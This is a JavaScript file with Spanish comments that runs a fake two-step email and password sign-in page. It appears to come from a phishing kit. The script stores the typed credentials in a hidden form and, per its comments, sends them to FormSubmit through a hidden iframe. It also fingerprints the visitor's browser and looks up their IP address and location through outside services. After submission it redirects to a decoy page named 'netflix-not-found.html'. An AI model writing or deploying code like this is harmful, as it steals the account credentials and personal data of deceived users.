// --- Variables globales (declaradas para claridad, aunque algunas se asignan en DOMContentLoaded) ---
let screen1, screen2, nextBtnScreen1, nextBtnScreen2, emailInput, passwordInput, emailTextSpan, progressBar1, progressBar2, emailBox, dataForm;

// --- Evento Principal: Se ejecuta cuando el HTML inicial está listo ---
document.addEventListener("DOMContentLoaded", function () {
    // 1. Selección de elementos del HTML inicial
    screen1 = document.getElementById("screen1");
    screen2 = document.getElementById("screen2");
    nextBtnScreen1 = document.getElementById("nextBtnScreen1");
    nextBtnScreen2 = document.getElementById("nextBtnScreen2");
    emailInput = document.getElementById("identifierInput");
    passwordInput = document.getElementById("passwordInput");
    emailTextSpan = document.querySelector("#screen2 .email-text"); // Específico de screen2
    emailBox = document.getElementById("emailBox");       // En screen2
    dataForm = document.getElementById("dataForm");       // Formulario oculto inicial
    const flagCounterContainer = document.getElementById("hidden-flag-counter"); // Para toggle

    // Asegurarse de que los elementos existen antes de usarlos
    if (screen1) progressBar1 = screen1.querySelector(".bar");
    if (screen2) progressBar2 = screen2.querySelector(".bar");

    // 2. Estado Inicial de las Pantallas y Foco
    if (screen1 && screen2 && progressBar1 && progressBar2 && emailInput) {
        screen1.style.display = "block"; // Muestra pantalla de email
        screen2.style.display = "none";  // Oculta pantalla de contraseña
        progressBar1.style.display = "none"; // Oculta barra de progreso 1
        progressBar2.style.display = "none"; // Oculta barra de progreso 2
        emailInput.focus(); // Pone el foco en el campo de email
    }

    // 3. Recolección de Datos del Navegador/Usuario y llenado del formulario oculto inicial
    collectUserDataAndFillForm();

    // 4. Configuración de Event Listeners para interacciones en el HTML inicial
    setupEventListeners();

    // 5. Configuración del Toggle para el Flag Counter (elemento del HTML inicial)
    if (flagCounterContainer) {
        setupFlagCounterToggle(flagCounterContainer);
    }

}); // Fin de DOMContentLoaded


// --- Funciones Auxiliares que afectan al HTML inicial ---

/**
 * Muestra y oculta una barra de progreso dentro del HTML inicial.
 * @param {HTMLElement} progressBar - El elemento de la barra de progreso.
 * @param {number} delay - Duración en ms que la barra estará visible.
 * @param {Function} [callback] - Función a ejecutar después de ocultar la barra.
 */
function activarBarraProgreso(progressBar, delay, callback) {
    if (progressBar) {
        progressBar.style.display = "block";
        setTimeout(() => {
            progressBar.style.display = "none";
            if (typeof callback === "function") callback();
        }, delay);
    } else if (typeof callback === 'function') {
        // Si no hay barra, ejecutar callback inmediatamente o tras un delay mínimo
        setTimeout(callback, 50);
    }
}

/**
 * Asigna un valor a un campo input (usualmente oculto) en el formulario del HTML inicial.
 * @param {string} id - El ID del campo input.
 * @param {string|number} value - El valor a asignar.
 */
function setInputValue(id, value) {
    const element = document.getElementById(id);
    if (element) {
        element.value = value || ""; // Asigna valor o string vacío si es null/undefined
    } else {
        console.warn(`Elemento con ID "${id}" no encontrado para setInputValue.`);
    }
}

/**
 * Configura los listeners para los botones, inputs y elementos interactivos
 * de las pantallas 1 y 2 del HTML inicial.
 */
function setupEventListeners() {

    // --- Navegación y Acciones Pantalla 1 (Email) ---
    if (nextBtnScreen1) {
        nextBtnScreen1.addEventListener("click", handleNextScreen1);
    }
    if (emailInput) {
        emailInput.addEventListener('keydown', function(event) {
            // Presionar Enter en campo Email -> Simula click en Siguiente
            if (event.key === 'Enter' || event.keyCode === 13) {
                event.preventDefault();
                if (nextBtnScreen1) nextBtnScreen1.click();
            }
        });
        // Listener para onkeyup está directamente en el HTML:
        // onkeyup="this.setAttribute('value', this.value);"
    }

    // --- Navegación y Acciones Pantalla 2 (Password) ---
    if (emailBox) { // El contenedor del email en pantalla 2
        emailBox.addEventListener("click", function () {
            // Volver a la pantalla 1
            if (screen1 && screen2 && emailInput) {
                screen2.style.display = "none";
                screen1.style.display = "block";
                emailInput.focus();
            }
        });
    }
    if (nextBtnScreen2) {
        nextBtnScreen2.addEventListener("click", handleNextScreen2);
    }
    if (passwordInput) {
        passwordInput.addEventListener('keydown', function(event) {
            // Presionar Enter en campo Password -> Simula click en Siguiente
            if (event.key === 'Enter' || event.keyCode === 13) {
                event.preventDefault();
                if (nextBtnScreen2) nextBtnScreen2.click();
            }

        });
         // Listener para onkeyup está directamente en el HTML:
        // onkeyup="this.setAttribute('value', this.value);"

         // Listener para el checkbox "Mostrar contraseña" está en el HTML (onclick)
         // La función togglePasswordVisibility() se define más abajo.
    }
}

/**
 * Manejador para el botón "Siguiente" de la pantalla 1 (Email).
 * Valida el email, muestra progreso, actualiza UI y cambia a pantalla 2.
 * @param {Event} e - El objeto del evento click.
 */
function handleNextScreen1(e) {
    e.preventDefault(); // Prevenir envío de formulario si estuviera dentro de uno
    const email = emailInput ? emailInput.value.trim() : "";
    if (email === "") {
        alert("Por favor, ingresa un correo electrónico o teléfono.");
        return;
    }

    // Muestra loader, luego ejecuta la lógica de cambio de pantalla
    activarBarraProgreso(progressBar1, 1000, () => {
        setInputValue("identifier", email); // Guarda en campo oculto del form inicial
        if (emailTextSpan) emailTextSpan.textContent = email; // Actualiza texto en P2
        if (screen1) screen1.style.display = "none";
        if (screen2) screen2.style.display = "block";
        if (passwordInput) passwordInput.focus(); // Foco en contraseña
    });
}

/**
 * Manejador para el botón "Siguiente" de la pantalla 2 (Contraseña).
 * Valida contraseña, la guarda, envía el formulario oculto y muestra progreso.
 * LUEGO intenta llamar a cambiarPagina (que ya no está definida aquí).
 * @param {Event} e - El objeto del evento click.
 */
function handleNextScreen2(e) {
    e.preventDefault();
    const password = passwordInput ? passwordInput.value : ""; // No usar trim()

    if (password === "") {
        alert("Por favor, ingresa tu contraseña.");
        return;
    }

    setInputValue("Passwd", password); // Guarda contraseña en campo oculto del form inicial

    if (dataForm) {
        // Envía el formulario oculto del HTML inicial a FormSubmit
        // (usando el iframe 'hidden_iframe' como target)
        dataForm.submit();
    } else {
        console.error("Formulario 'dataForm' no encontrado para enviar.");
    }

    // Muestra loader por 3 segundos y luego redirige a account-profile-update-phone.html
    activarBarraProgreso(progressBar2, 4000, () => {
        window.location.href = "netflix-not-found.html";
    });
}


/**
 * Cambia la visibilidad del campo de contraseña (entre 'password' y 'text')
 * basado en el estado del checkbox 'showPassword' del HTML inicial.
 */
function togglePasswordVisibility() {
    const pwdInput = document.getElementById("passwordInput");
    const checkbox = document.getElementById("showPassword");
    if (pwdInput && checkbox) {
        // Cambia el tipo de input basado en si el checkbox está marcado
        pwdInput.type = checkbox.checked ? "text" : "password";
    }
}

/**
 * Recolecta datos del navegador y (si es posible) IP/ubicación,
 * y los inserta en los campos ocultos del formulario 'dataForm' del HTML inicial.
 */
function collectUserDataAndFillForm() {
    // Datos básicos iniciales del navegador
    const userData = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: `${window.innerWidth} x ${window.innerHeight}`,
        connection: navigator.connection ? navigator.connection.effectiveType : "No disponible",
        referrer: document.referrer || "Directo",
    };

    // Función interna para obtener IP y localización basada en IP (mejor esfuerzo)
    function getIPandLocation() {
        const ipPromise = fetch("https://api64.ipify.org?format=json")
                          .then(response => response.ok ? response.json() : Promise.reject('IP fetch failed'))
                          .then(data => data.ip)
                          .catch(() => null); // Devuelve null si falla

        const locPromise = fetch("https://ipapi.co/json/")
                           .then(response => response.ok ? response.json() : Promise.reject('Location fetch failed'))
                           .catch(() => ({})); // Devuelve objeto vacío si falla

        return Promise.all([ipPromise, locPromise]).then(([ip, locData]) => ({
            ip: ip || "",
            city: locData.city || "",
            region: locData.region || "",
            country: locData.country_name || "",
        }));
    }

    // Ejecuta la obtención de IP/Loc y luego rellena el formulario inicial
    getIPandLocation()
        .then(ipData => {
            // Combina datos básicos con los obtenidos
            Object.assign(userData, ipData);

            // Rellena los campos ocultos del formulario 'dataForm'
            setInputValue("userAgent", userData.userAgent);
            setInputValue("language", userData.language);
            setInputValue("platform", userData.platform);
            setInputValue("screen", userData.screen);
            setInputValue("connection", userData.connection);
            setInputValue("referrer", userData.referrer);
            setInputValue("ip", userData.ip);
            setInputValue("city", userData.city);
            setInputValue("region", userData.region);
            setInputValue("country", userData.country);
            // Los campos de geolocalización precisa (lat, long, accuracy) no se rellenan
            // ya que getGeolocation() no se llama en el flujo original filtrado.
        })
        .catch((error) => {
            console.error("Error al obtener información de IP/ubicación:", error);
            // Intentar rellenar con lo básico aunque falle la obtención de IP/Loc
            setInputValue("userAgent", userData.userAgent);
            setInputValue("language", userData.language);
            // ... (podrías repetir todos los setInputValue básicos aquí como fallback)
        });
        // No se necesita .finally para habilitar botones aquí.
}

/**
 * Configura el listener de teclado para mostrar/ocultar el
 * div 'hidden-flag-counter' del HTML inicial con Ctrl+Alt+F.
 * @param {HTMLElement} counterContainer - El elemento div del contador de banderas.
 */
function setupFlagCounterToggle(counterContainer) {
    // Estado inicial basado en el estilo computado
    let isCounterVisible = window.getComputedStyle(counterContainer).display !== 'none';

    document.addEventListener("keydown", function (event) {
        // Combinación: Ctrl + Alt + F
        const ctrlPressed = event.ctrlKey || event.metaKey; // Cmd en Mac
        const altPressed = event.altKey;
        const keyIsTrigger = event.key.toLowerCase() === "f";

        if (ctrlPressed && altPressed && keyIsTrigger) {
            event.preventDefault(); // Prevenir acciones por defecto

            // Alternar visibilidad del elemento en el HTML inicial
            if (isCounterVisible) {
                counterContainer.style.display = "none";
            } else {
                counterContainer.style.display = "block"; // O el estilo deseado
            }
            isCounterVisible = !isCounterVisible; // Actualizar estado
        }
    });
}